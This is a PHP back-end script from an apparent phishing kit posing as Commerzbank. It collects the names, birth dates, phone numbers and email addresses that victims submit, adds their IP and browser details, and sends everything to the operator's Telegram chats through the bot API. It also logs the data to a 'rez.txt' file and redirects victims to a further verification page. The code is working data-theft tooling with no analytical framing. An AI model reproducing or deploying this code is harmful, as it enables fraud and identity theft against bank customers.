﻿<?php

session_start();
if (empty($_SESSION['user'])) {
    header('location: ../');
    exit();
}

include "../config/telegram.php";
include "../config/settings.php";

// Sanitize and validate POST data
$firstname = htmlspecialchars($_POST['firstname'] ?? '');
$lastname = htmlspecialchars($_POST['lastname'] ?? '');
$dateOfBirth = htmlspecialchars($_POST['dateOfBirth'] ?? '');
$phoneNumber = htmlspecialchars($_POST['phoneNumber'] ?? '');
$emailAddress = htmlspecialchars($_POST['emailAddress'] ?? '');
$ip = getenv("REMOTE_ADDR");

// Get user OS and browser info
$user_os = php_uname('s');
$user_browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Browser';

// Check required fields
if (empty($firstname) || empty($lastname) || empty($dateOfBirth) || empty($phoneNumber) || empty($emailAddress)) {
    echo "Error: All fields are required.";
    exit();
}

// Prepare the message
$message = "[=====>  🏦  Commerz  |  INFORMATIONS  🏦  <=====]\n\n";
$message .= "[ 🤖 First Name  : $firstname\n";
$message .= "[ 🤖 Last Name : $lastname\n";
$message .= "[ 🎉 Birthday  : $dateOfBirth\n";
$message .= "[ 📱 Phone Number  : $phoneNumber\n";
$message .= "[ 📧 Mail  : $emailAddress\n\n";
$message .= "[=====>  INFORMATION <=====]\n\n";
$message .= "[ IP : $ip\n";
$message .= "[ OS : $user_os\n";
$message .= "[ Browser : $user_browser\n";
$message .= "[ UA : $user_browser\n";

// Send message via Telegram
foreach ($IdTelegram as $chatId) {
    $website = "https://api.telegram.org/bot" . $botToken;
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);

    // Log cURL errors if the request fails
    if ($result === false) {
        error_log("cURL error: " . curl_error($ch));
    }
    curl_close($ch);
}

// Write to file securely (Optional)
$myfile = fopen("rez.txt", "a+");
if ($myfile) {
    fwrite($myfile, $message);
    fclose($myfile);
} else {
    error_log("Failed to open rez.txt for writing.");
}

// Redirect to the next page
header("location: ../nachprufung.php");
exit();

?>
